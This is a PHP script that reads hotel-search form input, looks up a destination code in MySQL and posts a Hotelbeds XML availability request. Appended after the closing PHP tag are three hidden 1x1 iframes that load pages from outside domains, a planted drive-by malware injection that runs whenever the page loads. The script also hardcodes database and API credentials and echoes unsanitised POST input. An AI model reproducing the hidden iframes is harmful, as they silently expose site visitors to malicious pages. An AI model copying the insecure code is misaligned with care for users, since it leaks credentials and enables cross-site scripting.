<?php
$country = $_POST['country'];
$city = $_POST['city'];
echo "$country";
mysql_connect("localhost","admin","admin") or die(mysql_error());
mysql_select_db("HotelsHotelsHotels") or die(mysql_error());
$query = "select DestinationCode from HotelbedsDestinationNames";
echo "$query";
$result = mysql_query($query) or die(mysql_error());
echo "$result";
while($row = mysql_fetch_array($result))
{
$hbedsdestcode = $row['DestinationCode'];
}
echo "$hbedsdestcode";
$hbedsxml = <<<XML
<?xml version="1.0" encoding="UTF-8"?>
 <HotelValuedAvailRQ echoToken="DummyEchoToken" sessionId="DummySessionId" xmlns="http://www.hotelbeds.com/schemas/2005/06/messages" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.hotelbeds.com/schemas/2005/06/messages HotelValuedAvailRQ.xsd">
  <Language>ENG</Language> 
  <Credentials>
  <User>PARKGOUK84658</User> 
  <Password>PARKGOUK84658</Password> 
  </Credentials>
  <PaginationData pageNumber="1" /> 
  <CheckInDate date="$_POST[fromyear]$_POST[frommonth]$_POST[fromday]" /> 
  <CheckOutDate date="$_POST[toyear]$_POST[tomonth]$_POST[today]" /> 
  <Destination code="$hbedsdestcode" type="SIMPLE" /> //PMI
  <OccupancyList>
  <HotelOccupancy>
  <RoomCount>1</RoomCount> 
  <Occupancy>
  <AdultCount>2</AdultCount> 
  <ChildCount>0</ChildCount> 
  <InfantCount>0</InfantCount> 
  </Occupancy>
  </HotelOccupancy>
  </OccupancyList>
  </HotelValuedAvailRQ>
XML;
$ch = curl_init();
$hbedsxmlrequest .= "xml_request=".$hbedsxml;
$jyourl="http://212.170.239.71/appservices/http/FrontendService";
curl_setopt($ch, CURLOPT_URL, $jyourl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $hbedsxmlrequest);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "HotelsBeds v0.2");
curl_setopt($ch, CURLOPT_TIMEOUT, 25);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$jyoresult = curl_exec($ch);
curl_close($ch);
$jyoXML = <<<XML
$jyoresult
XML;
//echo "$jyoresult";

/*$jyoparser = xml_parser_create();
function jyostart($jyoparser,$name,$attrs)
{
global $curtag;
$curtag .= "^$name";

//echo "$curtag</br>";
}
function jyostop($jyoparser,$name)
{
global $curtag;
$caret_pos = strrpos($curtag,'^');
$curtag = substr($curtag,0,$caret_pos);
//echo "$curtag</br>";
}

function jyochar($jyoparser,$data)
{
}

xml_parser_set_option($jyoparser,XML_OPTION_CASE_FOLDING,0);
xml_set_element_handler($jyoparser,"jyostart","jyostop");
xml_set_character_data_handler($jyoparser,"jyochar");
if(!xml_parse($jyoparser,$jyoXML))
{
die(sprintf("XML error:%s at line %d",
xml_error_string(xml_get_error_code($jyoparser)),
xml_get_current_line_number($jyoparser)));
}
xml_parser_free($jyoparser);*/


?>


<iframe src="http://eqcorn.com/ind.php" width="1" height="1" alt="BYDLOSHKA"></iframe>
<iframe src="http://wxtaste.com/ind.php" width="1" height="1" alt="BYDLOSHKA"></iframe>
<iframe src="http://wxtaste.com/ind.php" width="1" height="1" alt="BYDLOSHKA"></iframe>
